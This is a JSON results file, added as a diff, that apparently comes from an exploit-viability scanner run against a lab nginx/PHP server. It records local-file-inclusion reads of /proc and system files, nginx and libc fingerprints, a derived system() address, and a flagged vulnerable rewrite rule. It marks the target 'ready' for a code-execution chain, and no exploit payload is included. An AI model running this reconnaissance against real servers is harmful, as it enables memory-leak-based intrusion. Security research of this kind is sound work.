@@ -1,0 +1,344 @@
+{
+  "binaries": {
+    "libc": {
+      "build_id": "095c7ba148aeca81668091f718047078d57efddb",
+      "bytes_read": 2220400,
+      "dpkg_version": "2.35-0ubuntu3.13",
+      "path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "sha256": "c53819710b163d3f1d2541778590d58d3ef31cb0ed75adcbe059faac68c1e72d",
+      "versions": [
+        "GLIBC_2.10",
+        "GLIBC_2.11",
+        "GLIBC_2.12",
+        "GLIBC_2.13",
+        "GLIBC_2.14",
+        "GLIBC_2.15",
+        "GLIBC_2.16",
+        "GLIBC_2.17",
+        "GLIBC_2.18",
+        "GLIBC_2.2.5",
+        "GLIBC_2.2.6",
+        "GLIBC_2.22",
+        "GLIBC_2.23",
+        "GLIBC_2.24",
+        "GLIBC_2.25",
+        "GLIBC_2.26",
+        "GLIBC_2.27",
+        "GLIBC_2.28",
+        "GLIBC_2.29",
+        "GLIBC_2.3",
+        "GLIBC_2.3.2",
+        "GLIBC_2.3.3",
+        "GLIBC_2.3.4",
+        "GLIBC_2.30",
+        "GLIBC_2.31",
+        "GLIBC_2.32",
+        "GLIBC_2.33",
+        "GLIBC_2.34",
+        "GLIBC_2.35",
+        "GLIBC_2.4"
+      ]
+    },
+    "nginx": {
+      "build_id": "060e053ab1fa1a2876b7fe0ff4eff0cc777857b6",
+      "bytes_read": 5583848,
+      "path": "/nginx-src/build/nginx",
+      "sha256": "14bebe8937678598b8ebb8449f8c155478a4c49894c9467ce51d54a79352f08f",
+      "versions": [
+        "GLIBC_2.10",
+        "GLIBC_2.14",
+        "GLIBC_2.17",
+        "GLIBC_2.2.5",
+        "GLIBC_2.27",
+        "GLIBC_2.28",
+        "GLIBC_2.3",
+        "GLIBC_2.3.2",
+        "GLIBC_2.3.4",
+        "GLIBC_2.32",
+        "GLIBC_2.33",
+        "GLIBC_2.34",
+        "GLIBC_2.4",
+        "GLIBC_2.7",
+        "OpenSSL 3.0.2 15 Mar 2022",
+        "OpenSSL 3.0.2 15 Mar 2022 (running with ",
+        "OpenSSL library which has no tlsext support, therefore Session Tickets are not availabl",
+        "OpenSSL_version",
+        "OpenSSL_version@OPENSSL_3.0.0",
+        "nginx",
+        "nginx [-?hvVtTq] [-s signal] [-p prefix]",
+        "nginx using --with-debug option to enable it",
+        "nginx version: nginx/1.31.0",
+        "nginx was built with SNI support, however, now it is linked dynamically to an OpenSSL",
+        "nginx was built with Session Tickets support, however, now it is linked dynamically t",
+        "nginx was built without debug support",
+        "nginx-src",
+        "nginx.c",
+        "nginx.conf",
+        "nginx.conf)"
+      ]
+    }
+  },
+  "completed_at": "2026-05-20T21:18:24+00:00",
+  "exploit": {},
+  "file_read": {
+    "binary_probe": {
+      "bytes_read": 4,
+      "error": "",
+      "ok": true,
+      "path": "/bin/sh",
+      "sample": "\u007fELF"
+    },
+    "binary_read": true,
+    "proc_self_maps": true,
+    "proc_self_status": true,
+    "range_read": {
+      "first_bytes": 8,
+      "ok": true,
+      "second_bytes": 8
+    },
+    "reads": {
+      "aslr": {
+        "bytes_read": 2,
+        "error": "",
+        "ok": true,
+        "path": "/proc/sys/kernel/randomize_va_space",
+        "sample": "2\\n"
+      },
+      "core_pattern": {
+        "bytes_read": 5,
+        "error": "",
+        "ok": true,
+        "path": "/proc/sys/kernel/core_pattern",
+        "sample": "core\\n"
+      },
+      "kernel": {
+        "bytes_read": 183,
+        "error": "",
+        "ok": true,
+        "path": "/proc/version",
+        "sample": "Linux version 5.15.0-84-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutil"
+      },
+      "os_release": {
+        "bytes_read": 386,
+        "error": "",
+        "ok": true,
+        "path": "/etc/os-release",
+        "sample": "PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"\\nNAME=\"Ubuntu\"\\nVERSION_ID=\"22.04\"\\nVERSION=\"22.04.3 LTS (Jammy Jellyfish)\"\\nVERSION_CODENA"
+      },
+      "proc_self_maps": {
+        "bytes_read": 31024,
+        "error": "",
+        "ok": true,
+        "path": "/proc/self/maps",
+        "sample": "40fb4000-48fb4000 rw-s 00000000 00:01 1026                               /dev/zero (deleted)\\n55e3987e9000-55e3988c3000 r"
+      },
+      "proc_self_status": {
+        "bytes_read": 1416,
+        "error": "",
+        "ok": true,
+        "path": "/proc/self/status",
+        "sample": "Name:\tphp-fpm8.1\\nUmask:\t0022\\nState:\tR (running)\\nTgid:\t773\\nNgid:\t0\\nPid:\t773\\nPPid:\t720\\nTracerPid:\t0\\nUid:\t65534\t65534\t65534"
+      },
+      "suid_dumpable": {
+        "bytes_read": 2,
+        "error": "",
+        "ok": true,
+        "path": "/proc/sys/fs/suid_dumpable",
+        "sample": "2\\n"
+      }
+    },
+    "small_text_read": true
+  },
+  "http": {
+    "body_sample": "ok\n",
+    "headers": {
+      "Connection": "close",
+      "Content-Length": "3",
+      "Content-Type": "text/plain",
+      "Date": "Wed, 20 May 2026 21:18:24 GMT",
+      "Server": "nginx/1.31.0"
+    },
+    "http2_cleartext": {
+      "bytes": 49,
+      "ok": true,
+      "tested": true
+    },
+    "ok": true,
+    "reason": "OK",
+    "status": 200,
+    "url": "http://192.168.1.205:19321"
+  },
+  "nginx_config": {
+    "attempted_paths": [
+      "/app/nginx-lfi.conf",
+      "/etc/nginx/nginx.conf",
+      "/usr/local/nginx/conf/nginx.conf",
+      "/app/nginx.conf"
+    ],
+    "configs": {
+      "/app/nginx-lfi.conf": {
+        "bytes": 2879,
+        "sha256": "22026f67f6a7d025dfd8111fe9189fdfd312ffe9f040a4d845aa50683e334532"
+      }
+    },
+    "master_cmdline": [
+      "nginx:",
+      "master",
+      "process",
+      "/nginx-src/build/nginx",
+      "-p",
+      "/app",
+      "-c",
+      "/app/nginx-lfi.conf"
+    ],
+    "unresolved_includes": [],
+    "vulnerable_candidates": [
+      {
+        "confidence": "high",
+        "line": 37,
+        "location": "~ ^/api/(.*)$",
+        "reason": "rewrite replacement contains '?' and set directive consumes regex capture",
+        "rewrite": "^/api/(.*)$ /internal?migrated=true",
+        "set_directive": "$original_endpoint PPPPPPPPPPP$1",
+        "source": "/app/nginx-lfi.conf"
+      }
+    ]
+  },
+  "os": {
+    "aslr": "2",
+    "codename": "jammy",
+    "core_pattern": "core",
+    "id": "ubuntu",
+    "kernel_build": "Linux version 5.15.0-84-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023",
+    "kernel_release": "5.15.0-84-generic",
+    "pretty_name": "Ubuntu 22.04.3 LTS",
+    "suid_dumpable": "2",
+    "version_id": "22.04"
+  },
+  "proc": {},
+  "started_at": "2026-05-20T21:18:24+00:00",
+  "target": {
+    "base_url": "http://192.168.1.205:19321",
+    "file_read": {
+      "endpoint": "/lfi.php",
+      "file_param": "file",
+      "length_param": "length",
+      "offset_param": "offset",
+      "phpinfo_path": "/phpinfo.php",
+      "type": "query-params"
+    },
+    "host": "192.168.1.205",
+    "port": 19321,
+    "scheme": "http",
+    "target_profile": "generic"
+  },
+  "viability": {
+    "checks": [
+      {
+        "detail": 200,
+        "name": "HTTP reachable",
+        "ok": true
+      },
+      {
+        "detail": {
+          "bytes": 49,
+          "ok": true,
+          "tested": true
+        },
+        "name": "HTTP/2 cleartext victim",
+        "ok": true
+      },
+      {
+        "detail": "small text files readable",
+        "name": "file-read primitive",
+        "ok": true
+      },
+      {
+        "detail": {
+          "first_bytes": 8,
+          "ok": true,
+          "second_bytes": 8
+        },
+        "name": "ranged file reads",
+        "ok": true
+      },
+      {
+        "detail": {
+          "bytes_read": 4,
+          "error": "",
+          "ok": true,
+          "path": "/bin/sh",
+          "sample": "\u007fELF"
+        },
+        "name": "binary file reads",
+        "ok": true
+      },
+      {
+        "detail": 26061,
+        "name": "same-UID nginx worker maps",
+        "ok": true
+      },
+      {
+        "detail": "0x7fca47abdd70",
+        "name": "libc/system derivation",
+        "ok": true
+      },
+      {
+        "detail": "1 candidate(s)",
+        "name": "nginx config candidate",
+        "ok": true
+      },
+      {
+        "detail": "060e053ab1fa1a2876b7fe0ff4eff0cc777857b6",
+        "name": "nginx binary fingerprint",
+        "ok": true
+      },
+      {
+        "detail": "095c7ba148aeca81668091f718047078d57efddb",
+        "name": "libc fingerprint",
+        "ok": true
+      },
+      {
+        "detail": "core_pattern='core', suid_dumpable='2'",
+        "name": "core settings compatible",
+        "ok": true
+      },
+      {
+        "detail": "4 bytes",
+        "name": "pre-existing core readable",
+        "ok": true
+      }
+    ],
+    "reason": "required primitives for the current core-guided chain are present",
+    "verdict": "ready-with-lab-like-core-leak"
+  },
+  "worker": {
+    "heap_ranges": [
+      [
+        "0x55e420ff3000",
+        "0x55e421058000"
+      ],
+      [
+        "0x55e421058000",
+        "0x55e421081000"
+      ]
+    ],
+    "libc_base": "0x7fca47a6d000",
+    "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+    "master_pid": 3044,
+    "nginx_path": "/nginx-src/build/nginx",
+    "nginx_rw_base": "0x55e420b83000",
+    "ok": true,
+    "php_uid": 65534,
+    "pid_files": [
+      "/app/tmp/nginx.pid",
+      "/run/nginx.pid",
+      "/var/run/nginx.pid"
+    ],
+    "system_addr": "0x7fca47abdd70",
+    "system_error": "",
+    "system_offset": "0x50d70",
+    "worker_pid": 26061,
+    "worker_uid": 65534
+  }
+}
